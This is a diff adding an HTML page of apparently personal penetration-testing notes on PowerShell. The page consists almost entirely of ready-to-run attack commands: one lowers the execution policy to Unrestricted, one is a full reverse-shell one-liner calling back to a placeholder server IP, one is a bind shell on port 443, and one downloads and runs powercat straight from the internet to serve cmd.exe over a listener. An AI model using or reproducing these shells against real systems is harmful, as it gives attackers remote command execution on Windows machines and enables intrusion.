@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2020-07-12 Sun 19:30 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>powershell</title>
+<meta name="generator" content="Org mode" />
+<meta name="author" content="Annie Mao" />
+<link rel="stylesheet" type="text/css" href="css/stylesheet.css" />
+<link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono&amp;display=swap" rel="stylesheet">
+<script type="text/javascript">
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+<!--/*--><![CDATA[/*><!--*/
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.cacheClassElem = elem.className;
+         elem.cacheClassTarget = target.className;
+         target.className = "code-highlighted";
+         elem.className   = "code-highlighted";
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(elem.cacheClassElem)
+         elem.className = elem.cacheClassElem;
+       if(elem.cacheClassTarget)
+         target.className = elem.cacheClassTarget;
+     }
+    /*]]>*///-->
+// @license-end
+</script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="index.html"> UP </a>
+ |
+ <a accesskey="H" href="index.html"> HOME </a>
+</div><div id="content">
+<h1 class="title">powershell</h1>
+
+<div id="outline-container-orgcefb4c2" class="outline-2">
+<h2 id="orgcefb4c2">Allow PowerShell scripts to run on a system</h2>
+<div class="outline-text-2" id="text-orgcefb4c2">
+<p>
+Run PowerShell as Administrator:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">Set-ExecutionPolicy Unrestricted
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orgeb4bcfa" class="outline-2">
+<h2 id="orgeb4bcfa">Reverse shell via PowerShell</h2>
+<div class="outline-text-2" id="text-orgeb4bcfa">
+<div class="org-src-container">
+<pre class="src src-shell">powershell -c <span style="color: #98be65;">"</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;"> = New-Object System.Net.Sockets.TCPClient('&lt;server_ip&gt;',443);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;">.GetStream();[byte[]]</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;"> = 0..65535|%{0};while((</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">i</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Read(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">, 0, </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">.Length)) -ne 0){;</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">data</span><span style="color: #98be65;"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">,0, </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">i</span><span style="color: #98be65;">);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback</span><span style="color: #98be65;"> = (iex </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">data</span><span style="color: #98be65;"> 2&gt;&amp;1 | Out-String );</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback2</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback</span><span style="color: #98be65;"> + 'PS ' + (</span><span style="color: #98be65;">pwd</span><span style="color: #98be65;">).Path + '&gt; ';</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;"> = ([text.encoding]::ASCII).GetBytes(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback2</span><span style="color: #98be65;">);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Write(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;">,0,</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;">.Length);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Flush()};</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;">.Close()"</span>
+
+<span style="color: #5B6268;"># </span><span style="color: #5B6268;">verify exploit, run whoami equivalent</span>
+<span style="color: #51afef;">[</span>System.Security.Principal.WindowsIdentity<span style="color: #51afef;">]</span>::GetCurrent<span style="color: #51afef;">()</span>.Name
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orgb2ac13a" class="outline-2">
+<h2 id="orgb2ac13a">Bind shell via Powershell</h2>
+<div class="outline-text-2" id="text-orgb2ac13a">
+<div class="org-src-container">
+<pre class="src src-shell">powershell -c <span style="color: #98be65;">"</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">listener</span><span style="color: #98be65;"> = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">listener</span><span style="color: #98be65;">.start();</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">listener</span><span style="color: #98be65;">.AcceptTcpClient();</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;">.GetStream();[byte[]]</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;"> = 0..65535|%{0};while((</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">i</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Read(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">, 0, </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">.Length)) -ne 0){;</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">data</span><span style="color: #98be65;"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">bytes</span><span style="color: #98be65;">,0, </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">i</span><span style="color: #98be65;">);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback</span><span style="color: #98be65;"> = (iex </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">data</span><span style="color: #98be65;"> 2&gt;&amp;1 | Out-String );</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback2</span><span style="color: #98be65;"> = </span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback</span><span style="color: #98be65;"> + 'PS ' + (</span><span style="color: #98be65;">pwd</span><span style="color: #98be65;">).Path + '&gt; ';</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;"> = ([text.encoding]::ASCII).GetBytes(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendback2</span><span style="color: #98be65;">);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Write(</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;">,0,</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">sendbyte</span><span style="color: #98be65;">.Length);</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">stream</span><span style="color: #98be65;">.Flush()};</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">client</span><span style="color: #98be65;">.Close();</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">listener</span><span style="color: #98be65;">.Stop()"</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org2d66290" class="outline-2">
+<h2 id="org2d66290">Bind shell via <a href="https://github.com/besimorhino/powercat">powercat</a></h2>
+<div class="outline-text-2" id="text-org2d66290">
+<p>
+Drop powercat to windows machine using netcat or socat, or direct download it from the internet:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell"><span style="color: #c678dd;">iex</span> <span style="color: #51afef;">(</span>New-Object System.Net.Webclient<span style="color: #51afef;">)</span>.DownloadString<span style="color: #51afef;">(</span><span style="color: #98be65;">'https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span style="color: #51afef;">)</span>
+</pre>
+</div>
+<p>
+Load the powercat.ps1 script
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">. .\powercat.ps1
+</pre>
+</div>
+<p>
+Set up the bind shell
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">powercat -l -p <span style="color: #da8548; font-weight: bold;">443</span> -e cmd.exe
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="author">Author: Annie Mao</p>
+<p class="date">Created: 2020-07-12 Sun 19:30</p>
+</div>
+</body>
+</html>
